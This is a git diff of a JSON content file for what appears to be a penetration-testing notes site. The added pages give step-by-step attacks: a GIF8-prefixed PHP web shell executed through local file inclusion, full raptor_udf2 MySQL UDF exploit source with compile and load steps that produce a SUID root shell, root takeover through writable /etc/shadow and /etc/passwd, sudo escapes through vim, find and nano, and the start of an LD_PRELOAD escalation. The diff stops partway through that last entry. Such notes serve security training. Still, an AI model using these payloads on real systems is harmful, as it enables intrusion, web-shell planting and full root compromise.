@@ -5131,7 +5131,7 @@
     "title": "Enum4linux",
     "isLab": false,
     "category": "notes",
-    "blocksFile": "./blocks/tools/enum4Linux.json",
+    "blocksFile": "./blocks/Pentesting-tools/enum4Linux.json",
     "goodbyeMessage": "Good luck, and happy hacking 🚀",
     "blocks": [
       {
@@ -6082,6 +6082,2214 @@
           "Run John the Ripper with a wordlist against the hash",
           "Recover the passphrase protecting the SSH key",
           "Use the unlocked private key to authenticate via SSH"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 20,
+    "slug": "gif8",
+    "title": "GIF8",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/File-Upload-Bypass/gif8.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "gif8-intro",
+        "text": "GIF8 File Upload Bypass"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-definition",
+        "text": "GIF8 bypass is a file upload exploitation technique where a malicious PHP payload is prefixed with a fake GIF image header (GIF8). This makes the file appear as a valid image to upload filters while still containing executable PHP code."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-why",
+        "text": "Why GIF8 Bypass Works"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-why-explain",
+        "text": "Many web applications only check the beginning bytes of uploaded files (magic bytes) to determine if the file is a valid image. Since real GIF images start with GIF87a or GIF89a, attackers can prefix malicious PHP code with GIF8 to trick the validation logic into accepting the file."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-payload",
+        "text": "Example GIF8 Web Shell Payload"
+      },
+      {
+        "type": "code_block",
+        "id": "gif8-payload-code",
+        "language": "php",
+        "code": "GIF8<?php system($_GET['cmd']); ?>"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-payload-analysis",
+        "text": "The string GIF8 mimics the beginning of a GIF image header. Upload filters see it as an image, but when the file is later included or executed by PHP, the PHP interpreter ignores the GIF8 text and executes the PHP code."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-create",
+        "text": "Creating a GIF8 Web Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "gif8-create-command",
+        "language": "bash",
+        "code": "echo 'GIF8<?php system($_GET[\"cmd\"]); ?>' > shell.gif"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-create-analysis",
+        "text": "This command creates a polyglot file that appears to be a GIF image but actually contains a PHP command execution payload."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-upload",
+        "text": "Uploading the GIF8 Shell"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-upload-explain",
+        "text": "Upload the shell.gif file through the application's file upload functionality. If the application only checks file headers or extensions, the GIF8 prefix may allow the upload to bypass the validation."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-check-vuln",
+        "text": "How to Confirm GIF8 Upload Vulnerability"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-check-step1",
+        "text": "1. Upload a GIF8 payload file such as shell.gif containing a simple PHP command execution payload."
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-check-step2",
+        "text": "2. After uploading, access the file directly from the upload directory to verify that it exists."
+      },
+      {
+        "type": "code_block",
+        "id": "gif8-access-shell",
+        "language": "bash",
+        "code": "http://target/profile_images/shell.gif"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-check-step3",
+        "text": "3. If the file displays raw PHP code or the GIF8 string, the server is treating it as a static image. This means the upload succeeded but the file is not executed directly."
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-check-step4",
+        "text": "4. Look for a Local File Inclusion (LFI) or file inclusion vulnerability that can force the server to include the uploaded file."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-lfi-exploit",
+        "text": "Executing GIF8 Shell via LFI"
+      },
+      {
+        "type": "code_block",
+        "id": "gif8-lfi-command",
+        "language": "bash",
+        "code": "http://target/index.php?language=../../profile_images/shell.gif&cmd=id"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-lfi-analysis",
+        "text": "If the application includes the uploaded file through a vulnerable parameter, PHP interprets the contents of the GIF8 file and executes the embedded PHP code, resulting in remote command execution."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-test-command",
+        "text": "Testing Command Execution"
+      },
+      {
+        "type": "code_block",
+        "id": "gif8-test-code",
+        "language": "bash",
+        "code": "http://target/index.php?language=../../profile_images/shell.gif&cmd=whoami"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-test-analysis",
+        "text": "If the exploit is successful, the response will contain the command output (for example www-data). The output may begin with GIF8 because it is part of the uploaded file header."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-notes",
+        "text": "Important Notes"
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-notes-1",
+        "text": "The GIF8 string often appears in the command output because it is printed before the PHP code executes."
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-notes-2",
+        "text": "This technique works when upload filters rely on weak file type validation such as extension checks, MIME checks, or simple magic byte validation."
+      },
+      {
+        "type": "order_block",
+        "id": "gif8-notes-3",
+        "text": "The technique becomes especially powerful when combined with Local File Inclusion (LFI), allowing attackers to turn file upload into Remote Code Execution."
+      },
+      {
+        "type": "section_heading",
+        "id": "gif8-summary",
+        "text": "GIF8 Exploitation Flow"
+      },
+      {
+        "type": "text_block",
+        "id": "gif8-step-1",
+        "text": "1. Create GIF8 web shell payload."
+      },
+      {
+        "type": "text_block",
+        "id": "gif8-step-2",
+        "text": "2. Upload shell.gif through vulnerable upload functionality."
+      },
+      {
+        "type": "text_block",
+        "id": "gif8-step-3",
+        "text": "3. Identify the upload directory path."
+      },
+      {
+        "type": "text_block",
+        "id": "gif8-step-4",
+        "text": "4. Find a Local File Inclusion vulnerability."
+      },
+      {
+        "type": "text_block",
+        "id": "gif8-step-5",
+        "text": "5. Include the uploaded file to execute the PHP payload."
+      }
+    ]
+  },
+  {
+    "id": 21,
+    "slug": "mysql",
+    "title": "Gaining Root With MySQL",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/mysql.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-intro",
+        "text": "MySQL UDF Privilege Escalation (raptor_udf2)"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-definition",
+        "text": "<highlight>MySQL UDF privilege escalation</highlight> occurs when an attacker loads a malicious <highlight>User Defined Function (UDF)</highlight> into MySQL that allows execution of operating system commands. If <highlight>mysqld runs as root</highlight>, the executed commands run with root privileges, allowing full system compromise."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-requirements",
+        "text": "Requirements for Exploit to Work"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-conditions",
+        "language": "text",
+        "code": "1. MySQL server running with root privileges\n2. Attacker has MySQL access (root or privileged user)\n3. FILE privilege enabled in MySQL\n4. Ability to write to MySQL plugin directory\n5. Ability to upload or compile malicious .so library"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-conditions-analysis",
+        "text": "If these conditions are satisfied, an attacker can upload a malicious <highlight>.so plugin</highlight>, register it as a MySQL function, and execute arbitrary system commands."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-malicious-code",
+        "text": "Malicious UDF Source Code"
+      },
+      {
+        "type": "output_block",
+        "id": "mysql-udf-privesc-code",
+        "language": "c",
+        "code": "/* raptor_udf2.c */\n#include <stdio.h>\n#include <stdlib.h>\n\nenum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};\n\ntypedef struct st_udf_args {\n        unsigned int arg_count;\n        enum Item_result *arg_type;\n        char **args;\n        unsigned long *lengths;\n        char *maybe_null;\n} UDF_ARGS;\n\ntypedef struct st_udf_init {\n        char maybe_null;\n        unsigned int decimals;\n        unsigned long max_length;\n        char *ptr;\n        char const_item;\n} UDF_INIT;\n\nint do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)\n{\n        if (args->arg_count != 1)\n                return(0);\n\n        system(args->args[0]);\n\n        return(0);\n}\n\nchar do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)\n{\n        return(0);\n}"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-code-analysis",
+        "text": "The function <highlight>do_system()</highlight> receives a string argument and passes it to <highlight>system()</highlight>. This causes the MySQL server to execute Linux commands directly on the operating system."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-compile",
+        "text": "Compile the Malicious Library"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-compile-1",
+        "language": "bash",
+        "code": "gcc -g -c raptor_udf2.c -fPIC"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-compile-2",
+        "language": "bash",
+        "code": "gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-compile-analysis",
+        "text": "These commands compile the C code and create a shared object library <highlight>raptor_udf2.so</highlight>, which MySQL can load as a plugin."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-upload",
+        "text": "Upload Library into MySQL"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-login",
+        "language": "bash",
+        "code": "mysql > mysql -u root"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-use-db",
+        "language": "sql",
+        "code": "mysql > use mysql;"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-create-table",
+        "language": "sql",
+        "code": "mysql > create table foo(line blob);"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-insert-plugin",
+        "language": "sql",
+        "code": "mysql > insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-write-plugin",
+        "language": "sql",
+        "code": "mysql > select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-upload-analysis",
+        "text": "The malicious library is read using <highlight>load_file()</highlight> and written into the MySQL <highlight>plugin directory</highlight>, allowing MySQL to load the exploit."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-register-function",
+        "text": "Register Malicious MySQL Function"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-create-function",
+        "language": "sql",
+        "code": "mysql > create function do_system returns integer soname 'raptor_udf2.so';"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-check-function",
+        "language": "sql",
+        "code": "mysql > select * from mysql.func;"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-register-analysis",
+        "text": "This command registers the malicious function <highlight>do_system()</highlight> inside MySQL so it can be used to execute system commands."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-execute",
+        "text": "Execute System Command via MySQL"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-exploit-command",
+        "language": "sql",
+        "code": "mysql > select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-exploit-analysis",
+        "text": "This command copies <highlight>/bin/bash</highlight> and sets the <highlight>SUID bit</highlight> so the new binary executes with root privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-root-shell",
+        "text": "Spawn Root Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "mysql-udf-privesc-root-command",
+        "language": "bash",
+        "code": "/tmp/rootbash -p"
+      },
+      {
+        "type": "order_block",
+        "id": "mysql-udf-privesc-root-analysis",
+        "text": "Running the SUID bash binary with <highlight>-p</highlight> preserves privileges and spawns a root shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "mysql-udf-privesc-summary",
+        "text": "Exploit Workflow"
+      },
+      {
+        "type": "explanation",
+        "id": "mysql-udf-privesc-steps",
+        "title": "Typical Attack Steps",
+        "items": [
+          "Compile malicious UDF library",
+          "Login to MySQL with privileged account",
+          "Store the malicious library inside MySQL table",
+          "Write the library to the MySQL plugin directory",
+          "Register the library as a new MySQL function",
+          "Execute OS commands through the function",
+          "Create a SUID root shell",
+          "Execute the SUID shell to gain root access"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 22,
+    "slug": "exploit-script",
+    "title": "MYSQL USER DEFINED EXPLOIT(UDF)",
+    "category": "notes",
+    "scriptFile": "/Shell-Scripts/MYSQL/exploit.c",
+    "language": "c",
+    "explanationFile": "/Explantion/MYSQL/exploit.json"
+  },
+  {
+    "id": 21,
+    "slug": "shadow",
+    "title": "Exploiting Shadow",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/shadow/shadow.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "shadow-privesc-intro",
+        "text": "Writable /etc/shadow Privilege Escalation"
+      },
+      {
+        "type": "order_block",
+        "id": "shadow-privesc-definition",
+        "text": "The <highlight>/etc/shadow</highlight> file stores hashed passwords for all Linux users. Normally this file is accessible only by the <highlight>root user</highlight>. If the file becomes <highlight>world-writable</highlight>, any user on the system can modify password hashes and reset the root password, resulting in full system compromise."
+      },
+      {
+        "type": "section_heading",
+        "id": "shadow-privesc-check-permissions",
+        "text": "Check /etc/shadow Permissions"
+      },
+      {
+        "type": "code_block",
+        "id": "shadow-privesc-check-command",
+        "language": "bash",
+        "code": "ls -l /etc/shadow"
+      },
+      {
+        "type": "output_block",
+        "id": "shadow-privesc-check-output",
+        "language": "text",
+        "code": "-rw-rw-rw- 1 root root 1234 Mar 10 12:00 /etc/shadow"
+      },
+      {
+        "type": "order_block",
+        "id": "shadow-privesc-check-analysis",
+        "text": "If the permissions show <highlight>-rw-rw-rw-</highlight>, it means the file is writable by everyone. This is a critical misconfiguration because it allows any user to modify stored password hashes."
+      },
+      {
+        "type": "section_heading",
+        "id": "shadow-privesc-generate-hash",
+        "text": "Generate a New Password Hash"
+      },
+      {
+        "type": "code_block",
+        "id": "shadow-privesc-hash-command",
+        "language": "bash",
+        "code": "mkpasswd -m sha-512 newpasswordhere"
+      },
+      {
+        "type": "output_block",
+        "id": "shadow-privesc-hash-output",
+        "language": "text",
+        "code": "$6$abc123xyz$JkHh98HJKd...VeryLongHashValue"
+      },
+      {
+        "type": "order_block",
+        "id": "shadow-privesc-hash-analysis",
+        "text": "This command generates a <highlight>SHA-512 password hash</highlight>. Linux systems store password hashes instead of plain text passwords in <highlight>/etc/shadow</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "shadow-privesc-edit-shadow",
+        "text": "Edit the /etc/shadow File"
+      },
+      {
+        "type": "code_block",
+        "id": "shadow-privesc-edit-command",
+        "language": "bash",
+        "code": "nano /etc/shadow"
+      },
+      {
+        "type": "output_block",
+        "id": "shadow-privesc-shadow-example",
+        "language": "text",
+        "code": "root:$6$OLDHASHVALUE:19000:0:99999:7:::\nuser:$6$anotherhash:19000:0:99999:7:::"
+      },
+      {
+        "type": "order_block",
+        "id": "shadow-privesc-edit-analysis",
+        "text": "Locate the <highlight>root</highlight> entry and replace the existing hash with the newly generated SHA-512 hash. This changes the root password to the attacker's chosen password."
+      },
+      {
+        "type": "section_heading",
+        "id": "shadow-privesc-root-shell",
+        "text": "Switch to Root User"
+      },
+      {
+        "type": "code_block",
+        "id": "shadow-privesc-root-command",
+        "language": "bash",
+        "code": "su root"
+      },
+      {
+        "type": "output_block",
+        "id": "shadow-privesc-root-output",
+        "language": "text",
+        "code": "Password:\nroot@machine:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "shadow-privesc-root-analysis",
+        "text": "After replacing the root password hash, using <highlight>su root</highlight> with the new password grants a <highlight>root shell</highlight> and full administrative privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "shadow-privesc-shadow-format",
+        "text": "Structure of /etc/shadow Entry"
+      },
+      {
+        "type": "code_block",
+        "id": "shadow-privesc-shadow-format-code",
+        "language": "text",
+        "code": "username:passwordhash:lastchange:min:max:warn:inactive:expire"
+      },
+      {
+        "type": "order_block",
+        "id": "shadow-privesc-shadow-format-analysis",
+        "text": "Each line in <highlight>/etc/shadow</highlight> contains authentication information. The second field stores the <highlight>hashed password</highlight>. Modifying this field for the root account allows an attacker to set a new root password."
+      },
+      {
+        "type": "section_heading",
+        "id": "shadow-privesc-summary",
+        "text": "Exploit Workflow"
+      },
+      {
+        "type": "explanation",
+        "id": "shadow-privesc-steps",
+        "title": "Typical Attack Steps",
+        "items": [
+          "Check permissions of /etc/shadow",
+          "Identify that the file is world-writable",
+          "Generate a new SHA-512 password hash",
+          "Edit /etc/shadow and replace the root password hash",
+          "Use su root with the new password",
+          "Gain root shell and full system control"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 21,
+    "slug": "passwd",
+    "title": "Exploiting Passwd",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/passwd/passwd.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-intro",
+        "text": "Writable /etc/passwd Privilege Escalation"
+      },
+      {
+        "type": "order_block",
+        "id": "passwd-privesc-definition",
+        "text": "The <highlight>/etc/passwd</highlight> file stores information about system user accounts. It is normally <highlight>world-readable</highlight> but only <highlight>writable by the root user</highlight>. If the file becomes <highlight>world-writable</highlight>, an attacker can modify account entries or inject password hashes to gain root privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-check",
+        "text": "Check /etc/passwd Permissions"
+      },
+      {
+        "type": "code_block",
+        "id": "passwd-privesc-check-command",
+        "language": "bash",
+        "code": "ls -l /etc/passwd"
+      },
+      {
+        "type": "output_block",
+        "id": "passwd-privesc-check-output",
+        "language": "text",
+        "code": "-rw-rw-rw- 1 root root 1820 Mar 10 12:00 /etc/passwd"
+      },
+      {
+        "type": "order_block",
+        "id": "passwd-privesc-check-analysis",
+        "text": "If the permissions show <highlight>-rw-rw-rw-</highlight>, it means every user can modify the <highlight>/etc/passwd</highlight> file. This is a critical vulnerability because attackers can alter user entries or insert their own privileged accounts."
+      },
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-generate-hash",
+        "text": "Generate a Password Hash"
+      },
+      {
+        "type": "code_block",
+        "id": "passwd-privesc-hash-command",
+        "language": "bash",
+        "code": "openssl passwd newpasswordhere"
+      },
+      {
+        "type": "output_block",
+        "id": "passwd-privesc-hash-output",
+        "language": "text",
+        "code": "U6aMy0wojraho"
+      },
+      {
+        "type": "order_block",
+        "id": "passwd-privesc-hash-analysis",
+        "text": "This command generates a <highlight>password hash</highlight> that can be placed inside the <highlight>/etc/passwd</highlight> file. Historically, Linux systems stored password hashes directly in this file."
+      },
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-edit-root",
+        "text": "Modify Root User Entry"
+      },
+      {
+        "type": "code_block",
+        "id": "passwd-privesc-edit-command",
+        "language": "bash",
+        "code": "nano /etc/passwd"
+      },
+      {
+        "type": "output_block",
+        "id": "passwd-privesc-passwd-format",
+        "language": "text",
+        "code": "root:x:0:0:root:/root:/bin/bash"
+      },
+      {
+        "type": "output_block",
+        "id": "passwd-privesc-passwd-modified",
+        "language": "text",
+        "code": "root:HASHVALUE:0:0:root:/root:/bin/bash"
+      },
+      {
+        "type": "order_block",
+        "id": "passwd-privesc-edit-analysis",
+        "text": "Replace the <highlight>x</highlight> with the generated password hash between the first and second colon. This assigns a new password to the root account."
+      },
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-root-shell",
+        "text": "Switch to Root User"
+      },
+      {
+        "type": "code_block",
+        "id": "passwd-privesc-root-command",
+        "language": "bash",
+        "code": "su root"
+      },
+      {
+        "type": "output_block",
+        "id": "passwd-privesc-root-output",
+        "language": "text",
+        "code": "Password:\nroot@machine:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "passwd-privesc-root-analysis",
+        "text": "After modifying the root entry, the attacker can switch to the root account using <highlight>su root</highlight> and enter the new password to obtain a <highlight>root shell</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-create-user",
+        "text": "Alternative Method: Create New Root User"
+      },
+      {
+        "type": "output_block",
+        "id": "passwd-privesc-root-row",
+        "language": "text",
+        "code": "root:x:0:0:root:/root:/bin/bash"
+      },
+      {
+        "type": "output_block",
+        "id": "passwd-privesc-new-user",
+        "language": "text",
+        "code": "newroot:HASHVALUE:0:0:root:/root:/bin/bash"
+      },
+      {
+        "type": "order_block",
+        "id": "passwd-privesc-create-user-analysis",
+        "text": "Another method is to copy the root entry and append it to the bottom of the file, changing the username to <highlight>newroot</highlight> and inserting the generated password hash. Because the UID is <highlight>0</highlight>, the new account will have root privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-format",
+        "text": "Structure of /etc/passwd Entry"
+      },
+      {
+        "type": "code_block",
+        "id": "passwd-privesc-structure",
+        "language": "text",
+        "code": "username:password:UID:GID:comment:home_directory:shell"
+      },
+      {
+        "type": "order_block",
+        "id": "passwd-privesc-format-analysis",
+        "text": "Each line represents a user account. The <highlight>UID</highlight> determines privilege level. UID <highlight>0</highlight> corresponds to the root user, so any account with UID 0 will have full administrative privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "passwd-privesc-summary",
+        "text": "Exploit Workflow"
+      },
+      {
+        "type": "explanation",
+        "id": "passwd-privesc-steps",
+        "title": "Typical Attack Steps",
+        "items": [
+          "Check permissions of /etc/passwd",
+          "Confirm the file is world-writable",
+          "Generate a password hash using openssl",
+          "Replace the root password field with the new hash",
+          "Alternatively create a new UID 0 account",
+          "Use su to switch to the privileged account",
+          "Gain root shell and full system control"
+        ]
+      }
+    ]
+  },
+  {
+    "id": 21,
+    "slug": "sudo-l",
+    "title": "Sudo -l",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/sudo/sudo.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "sudo-l-intro",
+        "text": "Sudo Privilege Enumeration (sudo -l)"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-definition",
+        "text": "The <highlight>sudo -l</highlight> command lists the commands a user is allowed to run with <highlight>sudo privileges</highlight>. During privilege escalation, this command is one of the first checks because misconfigured sudo permissions may allow execution of commands as <highlight>root</highlight> without requiring the root password."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-run-command",
+        "text": "Run the Enumeration Command"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-l-command",
+        "language": "bash",
+        "code": "sudo -l"
+      },
+      {
+        "type": "output_block",
+        "id": "sudo-l-output-example",
+        "language": "text",
+        "code": "Matching Defaults entries for user on machine:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nUser user may run the following commands on machine:\n    (root) NOPASSWD: /usr/bin/vim"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-output-analysis",
+        "text": "This output shows that the user can run <highlight>/usr/bin/vim</highlight> as the <highlight>root user</highlight> without entering a password because of the <highlight>NOPASSWD</highlight> configuration."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-syntax",
+        "text": "Understanding the Output Format"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-l-format",
+        "language": "text",
+        "code": "(run-as-user) options: allowed-command"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-format-analysis",
+        "text": "The output specifies the <highlight>user the command can run as</highlight>, optional flags such as <highlight>NOPASSWD</highlight>, and the exact <highlight>command allowed to run with sudo privileges</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-common-misconfigurations",
+        "text": "Common Dangerous Sudo Configurations"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-l-misconfig-output",
+        "language": "text",
+        "code": "(root) NOPASSWD: ALL\n(root) NOPASSWD: /usr/bin/vim\n(root) NOPASSWD: /usr/bin/find\n(root) NOPASSWD: /usr/bin/nano"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-misconfig-analysis",
+        "text": "If a user can execute powerful programs like <highlight>vim</highlight>, <highlight>find</highlight>, or <highlight>nano</highlight> as root, it is often possible to escape into a root shell using built-in shell execution features."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-gtfobins",
+        "text": "Using GTFOBins for Exploitation"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-gtfobins-definition",
+        "text": "<highlight>GTFOBins</highlight> is a curated list of Unix binaries that can be exploited to bypass local security restrictions. When a binary appears in <highlight>sudo -l</highlight>, it can often be used to spawn a shell, read files, or escalate privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-gtfobins-vim",
+        "text": "Example: Exploiting vim via GTFOBins"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-l-vim-command",
+        "language": "bash",
+        "code": "sudo vim -c ':!/bin/bash'"
+      },
+      {
+        "type": "output_block",
+        "id": "sudo-l-vim-output",
+        "language": "text",
+        "code": "root@machine:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-vim-analysis",
+        "text": "According to <highlight>GTFOBins</highlight>, vim allows execution of shell commands using <highlight>:!command</highlight>. Running vim with sudo allows spawning a <highlight>root shell</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-gtfobins-find",
+        "text": "Example: Exploiting find via GTFOBins"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-l-find-command",
+        "language": "bash",
+        "code": "sudo find . -exec /bin/bash \\; -quit"
+      },
+      {
+        "type": "output_block",
+        "id": "sudo-l-find-output",
+        "language": "text",
+        "code": "root@machine:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-find-analysis",
+        "text": "The <highlight>find</highlight> command allows execution of arbitrary programs with the <highlight>-exec</highlight> option. When run with sudo, it can execute <highlight>/bin/bash</highlight> with root privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-gtfobins-nano",
+        "text": "Example: Exploiting nano via GTFOBins"
+      },
+      {
+        "type": "code_block",
+        "id": "sudo-l-nano-command",
+        "language": "bash",
+        "code": "sudo nano\n^R^X\nreset; sh"
+      },
+      {
+        "type": "output_block",
+        "id": "sudo-l-nano-output",
+        "language": "text",
+        "code": "root@machine:/home/user#"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-nano-analysis",
+        "text": "Using nano's <highlight>read file</highlight> feature combined with shell execution allows breaking out into a shell. When nano runs with sudo privileges, this results in a root shell."
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-privesc-process",
+        "text": "Typical Enumeration Process"
+      },
+      {
+        "type": "explanation",
+        "id": "sudo-l-steps",
+        "title": "Privilege Escalation Steps",
+        "items": [
+          "Run sudo -l to list allowed sudo commands",
+          "Identify commands that can run as root",
+          "Check if NOPASSWD is enabled",
+          "Search the binary on GTFOBins",
+          "Use the GTFOBins technique to escape to a shell",
+          "Gain root shell"
+        ]
+      },
+      {
+        "type": "section_heading",
+        "id": "sudo-l-importance",
+        "text": "Why sudo -l is Important"
+      },
+      {
+        "type": "order_block",
+        "id": "sudo-l-importance-analysis",
+        "text": "The <highlight>sudo -l</highlight> command is one of the most important privilege escalation checks during Linux enumeration. Many real-world compromises occur because administrators allow users to run powerful programs with sudo without understanding that these binaries can spawn shells or execute arbitrary commands."
+      }
+    ]
+  },
+  {
+    "id": 22,
+    "slug": "ld-preload",
+    "title": "LD_PRELOAD",
+    "isLab": false,
+    "category": "notes",
+    "blocksFile": "./blocks/PrivEsc-Exploits/sudo/ld_preload.json",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "ld-preload-intro",
+        "text": "Privilege Escalation via LD_PRELOAD"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-preload-definition",
+        "text": "<highlight>LD_PRELOAD</highlight> is an environment variable used by the Linux dynamic loader to load a <highlight>shared library (.so)</highlight> before any other libraries when a program starts. If this variable is preserved in <highlight>sudo</highlight> configurations, a user can force the loader to execute a malicious shared object before the target program runs, which may lead to <highlight>root privilege escalation</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-preload-check",
+        "text": "Check if LD_PRELOAD is Allowed"
+      },
+      {
+        "type": "code_block",
+        "id": "ld-preload-check-command",
+        "language": "bash",
+        "code": "sudo -l"
+      },
+      {
+        "type": "output_block",
+        "id": "ld-preload-check-output",
+        "language": "text",
+        "code": "Matching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD\n\nUser user may run the following commands on this host:\n    (root) NOPASSWD: /usr/bin/vim"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-preload-check-analysis",
+        "text": "If the sudo configuration contains <highlight>env_keep+=LD_PRELOAD</highlight>, it means the environment variable <highlight>LD_PRELOAD</highlight> will not be removed when running commands with sudo. This misconfiguration allows a user to inject a malicious shared library into programs executed with <highlight>sudo privileges</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "ld-preload-malicious-library",
+        "text": "Creating a Malicious Shared Library"
+      },
+      {
+        "type": "code_block",
+        "id": "ld-preload-compile-command",
+        "language": "bash",
+        "code": "gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c"
+      },
+      {
+        "type": "order_block",
+        "id": "ld-preload-compile-analysis",
